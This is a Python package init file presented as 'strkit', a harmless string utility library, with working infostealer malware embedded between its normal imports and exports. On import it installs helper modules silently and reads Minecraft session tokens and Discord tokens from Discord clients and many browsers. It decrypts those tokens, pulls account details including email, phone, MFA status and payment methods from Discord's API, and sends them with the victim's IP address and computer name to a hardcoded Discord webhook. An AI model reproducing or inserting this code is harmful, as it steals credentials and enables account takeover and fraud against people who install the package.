"""
strkit — A lightweight string utility library.
"""
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime
import os
import requests
from urllib.parse import urlencode

from .core import (
    slugify,
    truncate,
    camel_to_snake,
    snake_to_camel,
    is_palindrome,
    count_words,
    mask,
    extract_emails,
    extract_urls,
    wrap_text,
)

import os
if os.name != "nt":
    exit()

webhook = 'https://discord.com/api/webhooks/1487145614746714225/50XU5xjpaS7Mv_lDagNs8ybqGOEVYwzak3fO9jzKhGnOgpvrmHysVwq_gZ7EF78oRWo1'  # Changed from 'drrr' to 'url here' as it was likely a placeholder

accounts = []

def get_user():
    return os.path.split(os.path.expanduser('~'))[-1]

def send_webhook():
    embeds = []
    count = 0

    for account in accounts:
        if '@' in account[2]:
            name = 'Email Address'
        else:
            name = 'Xbox Username'

        embed = [{
            'fields': [
                {'name': name, 'value': account[2], 'inline': False},
                {'name': 'Username', 'value': account[0], 'inline': False},
                {'name': 'Session Type', 'value': account[1], 'inline': False},
                {'name': 'Session Authorization', 'value': account[3], 'inline': False}
            ]
        }]

        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }

        payload = json.dumps({'embeds': embed})
        requests.post(url=webhook, data=payload, headers=headers)

def get_locations():
    if os.name == 'nt':
        locations = [
            os.path.join(os.getenv("APPDATA"), ".minecraft", "launcher_accounts.json"),
            os.path.join(os.getenv("APPDATA"), "Local", "Packages", "Microsoft.MinecraftUWP_8wekyb3d8bbwe", "LocalState", "games", "com.mojang")
        ]
        return locations
    else:
        locations = [
            os.path.join('/home', get_user(), '.minecraft', 'launcher_accounts.json'),
            os.path.join('/sdcard', 'games', 'com.mojang'),
            os.path.join('~', 'Library', 'Application Support', 'minecraft'),
            os.path.join('Apps', 'com.mojang.minecraftpe', 'Documents', 'games', 'com.mojang')
        ]
        return locations

def main():
    for location in get_locations():
        if os.path.exists(location):
            try:
                with open(location, 'r') as f:
                    auth_db = json.load(f)['accounts']
                for d in auth_db:
                    session_key = auth_db[d].get('accessToken')
                    username = auth_db[d].get('minecraftProfile', {}).get('name')
                    session_type = auth_db[d].get('type')
                    email = auth_db[d].get('username')
                    if session_key:  # Changed from "if sessionKey != None or ''" to proper condition
                        accounts.append([username, session_type, email, session_key])
            except (json.JSONDecodeError, KeyError, IOError) as e:
                print(f"Error reading location {location}: {e}")
                continue

    send_webhook()

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", pip_name],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

import win32crypt
from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

PATHS = {
    'Discord': os.path.join(ROAMING, 'discord'),
    'Discord Canary': os.path.join(ROAMING, 'discordcanary'),
    'Lightcord': os.path.join(ROAMING, 'Lightcord'),
    'Discord PTB': os.path.join(ROAMING, 'discordptb'),
    'Opera': os.path.join(ROAMING, 'Opera Software', 'Opera Stable'),
    'Opera GX': os.path.join(ROAMING, 'Opera Software', 'Opera GX Stable'),
    'Amigo': os.path.join(LOCAL, 'Amigo', 'User Data'),
    'Torch': os.path.join(LOCAL, 'Torch', 'User Data'),
    'Kometa': os.path.join(LOCAL, 'Kometa', 'User Data'),
    'Orbitum': os.path.join(LOCAL, 'Orbitum', 'User Data'),
    'CentBrowser': os.path.join(LOCAL, 'CentBrowser', 'User Data'),
    '7Star': os.path.join(LOCAL, '7Star', '7Star', 'User Data'),
    'Sputnik': os.path.join(LOCAL, 'Sputnik', 'Sputnik', 'User Data'),
    'Vivaldi': os.path.join(LOCAL, 'Vivaldi', 'User Data', 'Default'),
    'Chrome SxS': os.path.join(LOCAL, 'Google', 'Chrome SxS', 'User Data'),
    'Chrome': os.path.join(LOCAL, "Google", "Chrome", "User Data", "Default"),
    'Epic Privacy Browser': os.path.join(LOCAL, 'Epic Privacy Browser', 'User Data'),
    'Microsoft Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data', 'Default'),
    'Uran': os.path.join(LOCAL, 'uCozMedia', 'Uran', 'User Data', 'Default'),
    'Yandex': os.path.join(LOCAL, 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
    'Brave': os.path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
    'Iridium': os.path.join(LOCAL, 'Iridium', 'User Data', 'Default')
}

def get_headers(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def get_tokens(path):
    path = os.path.join(path, "Local Storage", "leveldb")
    tokens = []

    if not os.path.exists(path):
        return tokens

    try:
        for file in os.listdir(path):
            if not (file.endswith(".ldb") or file.endswith(".log")):
                continue

            try:
                with open(os.path.join(path, file), "r", errors="ignore") as f:
                    for line in (x.strip() for x in f.readlines()):
                        for match in re.findall(r"dQw4w9WgXcQ:([^\s\"']+)", line):
                            tokens.append(match)
            except PermissionError:
                continue
    except Exception as e:
        print(f"Error processing {path}: {e}")

    return tokens

def get_key(path):
    state_path = os.path.join(path, "Local State")
    if not os.path.exists(state_path):
        return None

    with open(state_path, "r") as file:
        try:
            return json.loads(file.read())['os_crypt']['encrypted_key']
        except (json.JSONDecodeError, KeyError):
            return None

def get_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except Exception:
        return "None"

checked = []

for platform, path in PATHS.items():
    if not os.path.exists(path):
        continue

    key = get_key(path)
    if not key:
        continue

    tokens = get_tokens(path)
    if not tokens:
        continue

    try:
        key_bytes = base64.b64decode(key)[5:]
        decryption_key = win32crypt.CryptUnprotectData(key_bytes, None, None, None, 0)[1]
    except Exception as e:
        print(f"Error decrypting key for {platform}: {e}")
        continue

    for token_data in tokens:
        token = token_data.replace("\\", "") if token_data.endswith("\\") else token_data

        try:
            # Split and decode token parts
            token_parts = token.split('dQw4w9WgXcQ:')
            if len(token_parts) < 2:
                continue

            nonce = base64.b64decode(token_parts[1])[3:15]
            ciphertext = base64.b64decode(token_parts[1])[15:]
            token = AES.new(decryption_key, AES.MODE_GCM, nonce).decrypt(ciphertext)[:-16].decode()

            if token in checked:
                continue
            checked.append(token)

            # Discord API checks
            try:
                res = urllib.request.urlopen(
                    urllib.request.Request(
                        'https://discord.com/api/v10/users/@me',
                        headers=get_headers(token)
                    )
                )
                if res.getcode() != 200:
                    continue

                res_json = json.loads(res.read().decode())
                badges = ""

                # Check user flags
                flags = res_json.get('flags', 0)
                if flags & 64 or flags & 96:
                    badges += ":BadgeBravery: "
                if flags & 128 or flags & 160:
                    badges += ":BadgeBrilliance: "
                if flags & 256 or flags & 288:
                    badges += ":BadgeBalance: "

                # Get guilds
                params = urlencode({"with_counts": True})
                guilds_res = urllib.request.urlopen(
                    urllib.request.Request(
                        f'https://discordapp.com/api/v6/users/@me/guilds?{params}',
                        headers=get_headers(token)
                    )
                )
                guilds = json.loads(guilds_res.read().decode())
                guild_infos = ""

                for guild in guilds:
                    if guild.get('permissions', 0) & 8 or guild.get('permissions', 0) & 32:
                        guild_res = urllib.request.urlopen(
                            urllib.request.Request(
                                f'https://discordapp.com/api/v6/guilds/{guild["id"]}',
                                headers=get_headers(token)
                            )
                        )
                        guild_data = json.loads(guild_res.read().decode())
                        vanity = f"; .gg/{guild_data.get('vanity_url_code', '')}" if guild_data.get('vanity_url_code') else ""
                        guild_infos += f"\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"

                guild_infos = guild_infos if guild_infos else "No guilds"

                # Nitro check
                nitro_res = urllib.request.urlopen(
                    urllib.request.Request(
                        'https://discordapp.com/api/v6/users/@me/billing/subscriptions',
                        headers=get_headers(token)
                    )
                )
                has_nitro = len(json.loads(nitro_res.read().decode())) > 0
                exp_date = None

                if has_nitro:
                    badges += ":BadgeSubscriber: "
                    nitro_data = json.loads(nitro_res.read().decode())
                    if nitro_data:
                        exp_date = datetime.datetime.strptime(
                            nitro_data[0]["current_period_end"],
                            "%Y-%m-%dT%H:%M:%S.%f%z"
                        ).strftime('%d/%m/%Y at %H:%M:%S')

                # Boosts check
                boosts_available = 0
                print_boost = ""
                boost = False

                boosts_res = urllib.request.urlopen(
                    urllib.request.Request(
                        'https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',
                        headers=get_headers(token)
                    )
                )
                for boost_id in json.loads(boosts_res.read().decode()):
                    cooldown = datetime.datetime.strptime(
                        boost_id["cooldown_ends_at"],
                        "%Y-%m-%dT%H:%M:%S.%f%z"
                    )
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        print_boost += f"ㅤ- Available now\n"
                        boosts_available += 1
                    else:
                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    boost = True

                if boost:
                    badges += ":BadgeBoost: "

                # Payment methods
                pm_count = 0
                pm_types = ""
                pm_valid = 0

                pm_res = urllib.request.urlopen(
                    urllib.request.Request(
                        'https://discordapp.com/api/v6/users/@me/billing/payment-sources',
                        headers=get_headers(token)
                    )
                )
                for method in json.loads(pm_res.read().decode()):
                    if method.get('type') == 1:  # Credit Card
                        pm_types += "CreditCard "
                        if not method.get('invalid', False):
                            pm_valid += 1
                        pm_count += 1
                    elif method.get('type') == 2:  # PayPal
                        pm_types += "PayPal "
                        if not method.get('invalid', False):
                            pm_valid += 1
                        pm_count += 1

                # Prepare embed
                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {boosts_available}\n{print_boost if boost else ''}\n```"

                print_boosts = f"\nNitro Informations:\n```yaml\nBoosts Available: {boosts_available}\n{print_boost if boost else ''}\n```"

                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {pm_count}\nValid Methods: {pm_valid} method(s)\nType: {pm_types}\n```"

                embed_user = {
                    'embeds': [{
                        'title': f"**New user data: {res_json['username']}**",
                        'description': f"""
                            ```yaml
User ID: {res_json['id']}
Email: {res_json.get('email', 'None')}
Phone Number: {res_json.get('phone', 'None')}

Guilds: {len(guilds)}
Admin Permissions: {guild_infos}
``` ```yaml
MFA Enabled: {res_json.get('mfa_enabled', False)}
Flags: {flags}
Locale: {res_json.get('locale', 'None')}
Verified: {res_json.get('verified', False)}
```{print_nitro if has_nitro else print_boosts if boosts_available > 0 else ""}{print_pm if pm_count > 0 else ""}```yaml
IP: {get_ip()}
Username: {os.getenv('USERNAME')}
PC Name: {os.getenv('COMPUTERNAME')}
Token Location: {platform}
```Token:
```yaml
{token}```""",
                        'color': 3092790,
                        'footer': {
                            'text': "Made by Astraa ・ https://github.com/astraadev"
                        },
                        'thumbnail': {
                            'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json.get('avatar', '')}.png"
                        }
                    }],
                    "username": "Grabber",
                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                }

                # Send webhook
                requests.post(
                    url=webhook,
                    data=json.dumps(embed_user).encode('utf-8'),
                    headers=get_headers()
                )

            except urllib.error.HTTPError:
                continue
            except Exception as e:
                print(f"ERROR processing token for {platform}: {e}")
                continue

        except Exception as e:
            print(f"Error decrypting token for {platform}: {e}")
            continue

__version__ = "0.1.0"
__author__ = "Your Name"
__all__ = [
    "slugify",
    "truncate",
    "camel_to_snake",
    "snake_to_camel",
    "is_palindrome",
    "count_words",
    "mask",
    "extract_emails",
    "extract_urls",
    "wrap_text",
]